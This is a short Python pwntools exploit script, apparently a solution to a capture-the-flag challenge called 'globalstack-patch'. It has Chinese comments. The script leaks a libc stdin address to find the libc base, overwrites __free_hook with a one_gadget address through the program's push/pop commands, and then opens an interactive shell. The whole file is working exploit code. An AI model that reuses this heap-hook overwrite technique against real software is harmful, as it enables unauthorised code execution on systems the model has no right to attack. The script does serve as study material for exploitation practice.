#!/usr/bin/env python3

from pwn import *

exe = ELF("./globalstack-patch")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe


def main():
    r = process("./globalstack-patch")
    r = remote("0.0.0.0","11101")
    r.sendlineafter(">> ",b"pop")
    r.sendlineafter(">> ",b"pop") # leak libc stdin address
    IO_2_1_stdin = int(r.recvline().decode().split(" ")[1])
    log.success(f"IO_2_1_stdin address : {hex(IO_2_1_stdin)}")
    
    libc_offset = libc.symbols["_IO_2_1_stdin_"] # stdin offset
    log.success(f"libc offect : {hex(libc_offset)}") # 印出 offset 0x1ec980
    libc_base = IO_2_1_stdin - libc_offset # 計算 base address
    log.success(f"libc base : {hex(libc_base)}") # 印出 base address
    
    r.sendlineafter(">> ",b"pop")
    r.sendlineafter(">> ",b"pop")
    r.sendlineafter(">> ",b"pop")
    r.sendlineafter(">> ",b"pop") # find top

    free_hook = libc_base + 0x1eee48
    log.success(f"__free_hook : {hex(free_hook)}")
    one_gadget = libc_base + 0xe3b01
    log.success(f"one_gadget : {hex(one_gadget)}")
    r.sendlineafter(">> ",b"push " + str(free_hook - 8).encode()) # 將 top 值修改成 __free_hook - 8
    r.sendlineafter(">> ",b"push " + str(one_gadget).encode()) # 將 __free_hook 修改成 one_gadget
    r.sendlineafter(">> ",b"exit")
    
    r.interactive()


if __name__ == "__main__":
    main()
